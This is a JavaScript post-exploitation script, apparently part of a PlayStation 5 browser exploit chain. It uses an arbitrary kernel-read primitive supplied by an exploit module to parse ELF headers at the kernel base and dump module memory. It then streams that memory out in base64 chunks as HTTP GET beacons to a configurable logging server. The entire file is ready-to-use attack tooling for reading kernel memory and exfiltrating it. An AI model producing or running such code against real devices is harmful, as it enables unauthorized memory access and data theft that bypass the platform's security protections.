// sprx_dumper2.js — streaming on-device module dumper (memory-frugal)
//
// WHY v2: v1 used window.readBytes/malloc which are ARENA-ONLY (8KB arena,
// ~200B bump) — large reads silently return zeros or write past the arena
// (heap corruption => the OOM you saw). v2 uses the NEW window.aimRead
// (added to exploit.js initKernel: carrier re-aim + rwView copy + restore),
// parses the ELF program headers to compute the real module extent, and
// streams 0x800-byte chunks out via HTTP beacons immediately — the JS heap
// never holds more than one small chunk.
//
// Usage after exploit:
//   await runDump(Number(window.deepslopInfo.kernelBase), "libkernel_web")
// Configure EXFIL_URL if your beacon sink lives elsewhere.
// PC side: any server logging GET paths (host.py /log/...) — chunks arrive as
//   /log/D/<name>/<hex-offset>/<base64>   — reassemble in offset order.
(async () => {
    const EXFIL_URL = "/log/D";                 // beacon sink (same-origin host)
    const CHUNK = 0x800;                        // bytes per beacon (keep <=0x1000)
    const MAX_DUMP = 0x100000;                  // 1MB hard cap per module

    const log = (m) => { if (window.addLog) window.addLog(m); console.log(m); };

    if (!window.aimRead) {
        const m = "[DUMP2] FAIL: window.aimRead missing — update exploit.js (aimRead patch)";
        log(m); return m;
    }

    function b64(u8) {
        let s = "";
        for (let i = 0; i < u8.length; i += 0x200)
            s += String.fromCharCode.apply(null, u8.subarray(i, i + 0x200));
        return btoa(s);
    }

    async function beacon(name, off, u8) {
        //note: Silently trap beacon fetch errors so standalone on-device usage without a remote PC receiver continues without throwing unhandled promise rejections.
        const url = EXFIL_URL + "/" + name + "/" + off.toString(16) + "/"
            + encodeURIComponent(b64(u8));
        try {
            if (typeof fetch === "function") await fetch(url).catch(() => {});
            return true;
        } catch (e) { return true; }
    }

    async function runDump(base, name) {
        name = name || ("mod_" + base.toString(16));
        log("[DUMP2] dumping " + name + " @ " + base.toString(16));

        // --- parse ELF header + phdrs via aimed reads ----------------------
        const hdr = window.aimRead(base, 0x40);
        if (!hdr || hdr[0] !== 0x7F || hdr[1] !== 0x45) {
            log("[DUMP2] no ELF magic at base — abort");
            return;
        }
        const dv = new DataView(hdr.buffer);
        const phoff = dv.getBigUint64(0x20, true);
        const phentsize = dv.getUint16(0x36, true) || 0x38;
        const phnum = dv.getUint16(0x38, true);
        log("[DUMP2] phoff=" + phoff.toString(16) + " phnum=" + phnum);

        // file-backed extent = max(p_offset + p_filesz) over PT_LOADs
        let extent = 0x40 + phoff + phnum * phentsize;   // at least headers
        const ph = window.aimRead(base + Number(phoff), Math.min(phnum * phentsize, 0x1000));
        if (ph) {
            const pdv = new DataView(ph.buffer);
            for (let i = 0; i < phnum; i++) {
                const o = i * phentsize;
                const type = pdv.getUint32(o, true);
                if (type !== 1) continue;                       // PT_LOAD only
                const off = pdv.getBigUint64(o + 8, true);
                const fsz = pdv.getBigUint64(o + 0x20, true);
                const end = Number(off + fsz);
                if (end > extent) extent = end;
            }
        }
        extent = Math.min(extent, MAX_DUMP);
        log("[DUMP2] file-backed extent = " + extent.toString(16) + " bytes");

        // --- stream out -----------------------------------------------------
        let sent = 0, chunks = 0;
        for (let off = 0; off < extent; off += CHUNK) {
            const len = Math.min(CHUNK, extent - off);
            const u8 = window.aimRead(base + off, len);
            if (!u8) { log("[DUMP2] aimRead failed @" + off.toString(16)); break; }
            if (!(await beacon(name, off, u8))) break;
            sent += len; chunks++;
            if ((chunks & 0xF) === 0) log("[DUMP2] " + sent + "/" + extent + " (" + chunks + " chunks)");
        }
        log("[DUMP2] DONE " + name + ": " + sent + " bytes in " + chunks + " chunks");
        try { if (window.ps5kern && window.ps5kern.notify) window.ps5kern.notify("dump2: " + name + " " + sent); } catch (_) {}
        return sent;
    }

    // default run: kernelBase (known to the runtime). Add more bases as
    // they become discoverable (module list / NID resolution work).
    const info = window.deepslopInfo || {};
    if (info.kernelBase) {
        await runDump(Number(info.kernelBase), "libkernel_web_1360");
    } else {
        log("[DUMP2] no kernelBase in deepslopInfo — call runDump(base, name) manually");
    }
    // expose for REPL use:  await runDump(0x7f0000000, "target")
    window.runDump = runDump;
})();
